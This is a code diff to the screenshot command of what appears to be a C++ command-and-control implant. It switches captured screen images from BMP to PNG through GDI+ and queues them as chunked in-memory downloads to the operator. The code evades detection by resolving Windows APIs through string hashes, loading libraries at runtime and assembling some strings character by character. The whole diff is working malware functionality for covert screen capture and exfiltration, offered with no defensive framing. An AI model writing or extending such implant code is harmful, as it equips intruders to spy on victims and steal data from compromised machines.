@@ -11,7 +11,7 @@
 using namespace stardust;
 using namespace starburst;
 
-// GDI types and constants
+// GDI types
 typedef int ( WINAPI *fn_GetSystemMetrics )( int );
 typedef HDC ( WINAPI *fn_GetDC )( HWND );
 typedef int ( WINAPI *fn_ReleaseDC )( HWND, HDC );
@@ -23,9 +23,38 @@ typedef int ( WINAPI *fn_GetDIBits )( HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAP
 typedef BOOL ( WINAPI *fn_DeleteObject )( HGDIOBJ );
 typedef BOOL ( WINAPI *fn_DeleteDC )( HDC );
 
+// GDI+ types (opaque)
+struct GpBitmap;
+struct GpImage;
+
+struct GdiplusStartupInput {
+    UINT32 GdiplusVersion;
+    void*  DebugEventCallback;
+    BOOL   SuppressBackgroundThread;
+    BOOL   SuppressExternalCodecs;
+};
+
+typedef int ( WINAPI *fn_GdiplusStartup )( ULONG_PTR*, const GdiplusStartupInput*, void* );
+typedef void ( WINAPI *fn_GdiplusShutdown )( ULONG_PTR );
+typedef int ( WINAPI *fn_GdipCreateBitmapFromGdiDib )( const BITMAPINFO*, void*, GpBitmap** );
+typedef int ( WINAPI *fn_GdipSaveImageToStream )( GpImage*, IUnknown*, const GUID*, const void* );
+typedef int ( WINAPI *fn_GdipDisposeImage )( GpImage* );
+
+typedef HRESULT ( WINAPI *fn_CreateStreamOnHGlobal )( HGLOBAL, BOOL, IUnknown** );
+typedef HRESULT ( WINAPI *fn_GetHGlobalFromStream )( IUnknown*, HGLOBAL* );
+
+typedef SIZE_T  ( WINAPI *fn_GlobalSize )( HGLOBAL );
+typedef LPVOID  ( WINAPI *fn_GlobalLock )( HGLOBAL );
+typedef BOOL    ( WINAPI *fn_GlobalUnlock )( HGLOBAL );
+
 #define SM_CXSCREEN 0
 #define SM_CYSCREEN 1
 #define SRCCOPY     0x00CC0020
+
+static const GUID png_encoder_clsid = {
+    0x557CF406, 0x1A04, 0x11D3,
+    { 0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E }
+};
 
 auto declfn starburst::cmd_screenshot(
     _Inout_ instance& inst,
@@ -34,14 +63,21 @@ auto declfn starburst::cmd_screenshot(
 ) -> void {
     (void)params;
 
-    STK_USER32(_n1);
-    STK_GDI32(_n2);
-    auto h_user32 = inst.kernel32.LoadLibraryA( _n1 );
-    auto h_gdi32  = inst.kernel32.LoadLibraryA( _n2 );
+    STK_USER32(_n_user32);
+    STK_GDI32(_n_gdi32);
+    STK_GDIPLUS(_n_gdiplus);
+    STK_OLE32(_n_ole32);
+    STK_COMBASE(_n_combase);
 
-    if ( !h_user32 || !h_gdi32 ) {
+    auto h_user32  = inst.kernel32.LoadLibraryA( _n_user32 );
+    auto h_gdi32   = inst.kernel32.LoadLibraryA( _n_gdi32 );
+    auto h_gdiplus = inst.kernel32.LoadLibraryA( _n_gdiplus );
+    auto h_ole32   = inst.kernel32.LoadLibraryA( _n_ole32 );
+    auto h_combase = inst.kernel32.LoadLibraryA( _n_combase );
+
+    if ( !h_user32 || !h_gdi32 || !h_gdiplus || !h_ole32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load user32/gdi32" ) ) );
+            symbol<char*>( const_cast<char*>( "failed to load user32/gdi32/gdiplus/ole32" ) ) );
         return;
     }
 
@@ -66,11 +102,70 @@ auto declfn starburst::cmd_screenshot(
     auto pDeleteDC = reinterpret_cast<fn_DeleteDC>(
         resolve::_api( reinterpret_cast<uintptr_t>( h_gdi32 ), expr::hash_string( "DeleteDC" ) ) );
 
-    if ( !pGetSystemMetrics || !pGetDC || !pReleaseDC || !pCreateCompatibleDC ||
-         !pCreateCompatibleBitmap || !pSelectObject || !pBitBlt || !pGetDIBits ||
-         !pDeleteObject || !pDeleteDC ) {
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolve failed" ) ) );
+    auto pGdiplusStartup = reinterpret_cast<fn_GdiplusStartup>(
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdiplus ), expr::hash_string( "GdiplusStartup" ) ) );
+    auto pGdiplusShutdown = reinterpret_cast<fn_GdiplusShutdown>(
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdiplus ), expr::hash_string( "GdiplusShutdown" ) ) );
+    auto pGdipCreateBitmapFromGdiDib = reinterpret_cast<fn_GdipCreateBitmapFromGdiDib>(
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdiplus ), expr::hash_string( "GdipCreateBitmapFromGdiDib" ) ) );
+    auto pGdipSaveImageToStream = reinterpret_cast<fn_GdipSaveImageToStream>(
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdiplus ), expr::hash_string( "GdipSaveImageToStream" ) ) );
+    auto pGdipDisposeImage = reinterpret_cast<fn_GdipDisposeImage>(
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdiplus ), expr::hash_string( "GdipDisposeImage" ) ) );
+
+    auto pCreateStreamOnHGlobal = reinterpret_cast<fn_CreateStreamOnHGlobal>( 0 );
+    auto pGetHGlobalFromStream  = reinterpret_cast<fn_GetHGlobalFromStream>( 0 );
+    if ( h_combase ) {
+        pCreateStreamOnHGlobal = reinterpret_cast<fn_CreateStreamOnHGlobal>(
+            resolve::_api( reinterpret_cast<uintptr_t>( h_combase ), expr::hash_string( "CreateStreamOnHGlobal" ) ) );
+        pGetHGlobalFromStream = reinterpret_cast<fn_GetHGlobalFromStream>(
+            resolve::_api( reinterpret_cast<uintptr_t>( h_combase ), expr::hash_string( "GetHGlobalFromStream" ) ) );
+    }
+    if ( !pCreateStreamOnHGlobal )
+        pCreateStreamOnHGlobal = reinterpret_cast<fn_CreateStreamOnHGlobal>(
+            resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ), expr::hash_string( "CreateStreamOnHGlobal" ) ) );
+    if ( !pGetHGlobalFromStream )
+        pGetHGlobalFromStream = reinterpret_cast<fn_GetHGlobalFromStream>(
+            resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ), expr::hash_string( "GetHGlobalFromStream" ) ) );
+
+    auto pGlobalSize = reinterpret_cast<fn_GlobalSize>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "GlobalSize" ) ) );
+    auto pGlobalLock = reinterpret_cast<fn_GlobalLock>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "GlobalLock" ) ) );
+    auto pGlobalUnlock = reinterpret_cast<fn_GlobalUnlock>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "GlobalUnlock" ) ) );
+
+    const char* miss = nullptr;
+    if      ( !pGetSystemMetrics )            miss = "GetSystemMetrics";
+    else if ( !pGetDC )                       miss = "GetDC";
+    else if ( !pReleaseDC )                   miss = "ReleaseDC";
+    else if ( !pCreateCompatibleDC )          miss = "CreateCompatibleDC";
+    else if ( !pCreateCompatibleBitmap )      miss = "CreateCompatibleBitmap";
+    else if ( !pSelectObject )                miss = "SelectObject";
+    else if ( !pBitBlt )                      miss = "BitBlt";
+    else if ( !pGetDIBits )                   miss = "GetDIBits";
+    else if ( !pDeleteObject )                miss = "DeleteObject";
+    else if ( !pDeleteDC )                    miss = "DeleteDC";
+    else if ( !pGdiplusStartup )              miss = "GdiplusStartup";
+    else if ( !pGdiplusShutdown )             miss = "GdiplusShutdown";
+    else if ( !pGdipCreateBitmapFromGdiDib )  miss = "GdipCreateBitmapFromGdiDib";
+    else if ( !pGdipSaveImageToStream )       miss = "GdipSaveImageToStream";
+    else if ( !pGdipDisposeImage )            miss = "GdipDisposeImage";
+    else if ( !pCreateStreamOnHGlobal )       miss = "CreateStreamOnHGlobal";
+    else if ( !pGetHGlobalFromStream )        miss = "GetHGlobalFromStream";
+    else if ( !pGlobalSize )                  miss = "GlobalSize";
+    else if ( !pGlobalLock )                  miss = "GlobalLock";
+    else if ( !pGlobalUnlock )                miss = "GlobalUnlock";
+
+    if ( miss ) {
+        char err[80] = { 0 };
+        char prefix[] = { 'A','P','I',' ','r','e','s','o','l','v','e',' ',
+                          'f','a','i','l','e','d',':',' ', 0 };
+        int  ei = 0;
+        for ( ; prefix[ei] && ei < 60; ei++ ) err[ei] = prefix[ei];
+        for ( int j = 0; miss[j] && ei < 79; j++, ei++ ) err[ei] = miss[j];
+        err[ei] = '\0';
+        queue_response( inst, task_uuid, RESPONSE_ERROR, err );
         return;
     }
 
@@ -86,10 +181,9 @@ auto declfn starburst::cmd_screenshot(
 
     uint32_t row_stride = ((width * 3 + 3) & ~3);
     uint32_t pixel_size = row_stride * height;
-    uint32_t bmp_size = 54 + pixel_size;
 
-    auto bmp_buf = static_cast<uint8_t*>( inst.heap_alloc( bmp_size ) );
-    if ( !bmp_buf ) {
+    auto pixel_buf = static_cast<uint8_t*>( inst.heap_alloc( pixel_size ) );
+    if ( !pixel_buf ) {
         pDeleteObject( h_bmp );
         pDeleteDC( h_mem );
         pReleaseDC( nullptr, h_screen );
@@ -107,22 +201,103 @@ auto declfn starburst::cmd_screenshot(
     bi.biCompression = BI_RGB;
     bi.biSizeImage   = pixel_size;
 
-    pGetDIBits( h_mem, h_bmp, 0, height, bmp_buf + 54,
+    pGetDIBits( h_mem, h_bmp, 0, height, pixel_buf,
         reinterpret_cast<BITMAPINFO*>( &bi ), DIB_RGB_COLORS );
-
-    bmp_buf[0] = 'B'; bmp_buf[1] = 'M';
-    *reinterpret_cast<uint32_t*>( bmp_buf + 2 )  = bmp_size;
-    *reinterpret_cast<uint32_t*>( bmp_buf + 10 ) = 54;
-    memory::copy( bmp_buf + 14, &bi, sizeof( bi ) );
 
     pDeleteObject( h_bmp );
     pDeleteDC( h_mem );
     pReleaseDC( nullptr, h_screen );
 
-    uint32_t total_chunks = ( bmp_size + CHUNK_SIZE - 1 ) / CHUNK_SIZE;
+    ULONG_PTR gdip_token = 0;
+    GdiplusStartupInput startup_in = {};
+    startup_in.GdiplusVersion = 1;
+    if ( pGdiplusStartup( &gdip_token, &startup_in, nullptr ) != 0 ) {
+        inst.heap_free( pixel_buf );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "GdiplusStartup failed" ) ) );
+        return;
+    }
+
+    GpBitmap* gp_bmp = nullptr;
+    if ( pGdipCreateBitmapFromGdiDib( reinterpret_cast<const BITMAPINFO*>( &bi ),
+                                      pixel_buf, &gp_bmp ) != 0 || !gp_bmp ) {
+        inst.heap_free( pixel_buf );
+        pGdiplusShutdown( gdip_token );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "GdipCreateBitmapFromGdiDib failed" ) ) );
+        return;
+    }
+
+    IUnknown* p_stream = nullptr;
+    if ( pCreateStreamOnHGlobal( nullptr, TRUE, &p_stream ) != S_OK || !p_stream ) {
+        pGdipDisposeImage( reinterpret_cast<GpImage*>( gp_bmp ) );
+        inst.heap_free( pixel_buf );
+        pGdiplusShutdown( gdip_token );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "CreateStreamOnHGlobal failed" ) ) );
+        return;
+    }
+
+    if ( pGdipSaveImageToStream( reinterpret_cast<GpImage*>( gp_bmp ), p_stream,
+                                 &png_encoder_clsid, nullptr ) != 0 ) {
+        p_stream->Release();
+        pGdipDisposeImage( reinterpret_cast<GpImage*>( gp_bmp ) );
+        inst.heap_free( pixel_buf );
+        pGdiplusShutdown( gdip_token );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "GdipSaveImageToStream failed" ) ) );
+        return;
+    }
+
+    HGLOBAL h_glob = nullptr;
+    if ( pGetHGlobalFromStream( p_stream, &h_glob ) != S_OK || !h_glob ) {
+        p_stream->Release();
+        pGdipDisposeImage( reinterpret_cast<GpImage*>( gp_bmp ) );
+        inst.heap_free( pixel_buf );
+        pGdiplusShutdown( gdip_token );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "GetHGlobalFromStream failed" ) ) );
+        return;
+    }
+
+    SIZE_T png_size = pGlobalSize( h_glob );
+    auto   src_ptr  = static_cast<uint8_t*>( pGlobalLock( h_glob ) );
+
+    if ( !src_ptr || png_size == 0 ) {
+        if ( src_ptr ) pGlobalUnlock( h_glob );
+        p_stream->Release();
+        pGdipDisposeImage( reinterpret_cast<GpImage*>( gp_bmp ) );
+        inst.heap_free( pixel_buf );
+        pGdiplusShutdown( gdip_token );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "empty PNG stream" ) ) );
+        return;
+    }
+
+    auto png_buf = static_cast<uint8_t*>( inst.heap_alloc( static_cast<uint32_t>( png_size ) ) );
+    if ( !png_buf ) {
+        pGlobalUnlock( h_glob );
+        p_stream->Release();
+        pGdipDisposeImage( reinterpret_cast<GpImage*>( gp_bmp ) );
+        inst.heap_free( pixel_buf );
+        pGdiplusShutdown( gdip_token );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+        return;
+    }
+
+    memory::copy( png_buf, src_ptr, png_size );
+
+    pGlobalUnlock( h_glob );
+    p_stream->Release();
+    pGdipDisposeImage( reinterpret_cast<GpImage*>( gp_bmp ) );
+    inst.heap_free( pixel_buf );
+    pGdiplusShutdown( gdip_token );
+
+    uint32_t total_size   = static_cast<uint32_t>( png_size );
+    uint32_t total_chunks = ( total_size + CHUNK_SIZE - 1 ) / CHUNK_SIZE;
     if ( total_chunks == 0 ) total_chunks = 1;
 
-    // find free pending download slot
     int slot = -1;
     for ( uint32_t s = 0; s < inst.MAX_PENDING_DOWNLOADS; s++ ) {
         if ( !inst.downloads.entries[s].active ) {
@@ -132,24 +307,22 @@ auto declfn starburst::cmd_screenshot(
     }
 
     if ( slot < 0 ) {
-        inst.heap_free( bmp_buf );
+        inst.heap_free( png_buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "too many pending downloads" ) ) );
         return;
     }
 
-    // store pending download state (in-memory buffer)
     auto& dl = inst.downloads.entries[slot];
     memory::copy( dl.task_uuid, task_uuid, 36 );
     dl.task_uuid[36] = '\0';
     dl.h_file       = INVALID_HANDLE_VALUE;
-    dl.mem_buf      = bmp_buf;
-    dl.total_size   = bmp_size;
+    dl.mem_buf      = png_buf;
+    dl.total_size   = total_size;
     dl.total_chunks = total_chunks;
     dl.is_mem       = true;
     dl.active       = true;
 
-    // queue DOWNLOAD_INIT only
     {
         auto pkg = package_create( inst );
         package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
@@ -157,8 +330,8 @@ auto declfn starburst::cmd_screenshot(
         package_add_byte( inst, pkg, RESPONSE_PROCESSING );
         package_add_byte( inst, pkg, DOWNLOAD_INIT );
         package_add_int32( inst, pkg, total_chunks );
-        package_add_int32( inst, pkg, bmp_size );
-        package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "screenshot.bmp" ) ) );
+        package_add_int32( inst, pkg, total_size );
+        package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "screenshot.png" ) ) );
 
         uint32_t data_len = 0;
         auto data = package_build( pkg, &data_len );
@@ -182,8 +355,8 @@ auto declfn starburst::cmd_screenshot(
         package_destroy( inst, pkg );
     }
 
-    DBG_PRINT( inst, "screenshot init queued: %u bytes, %u chunks, slot %d\n",
-        bmp_size, total_chunks, slot );
+    DBG_PRINT( inst, "screenshot init queued: %u bytes PNG, %u chunks, slot %d\n",
+        total_size, total_chunks, slot );
 }
 
 #endif
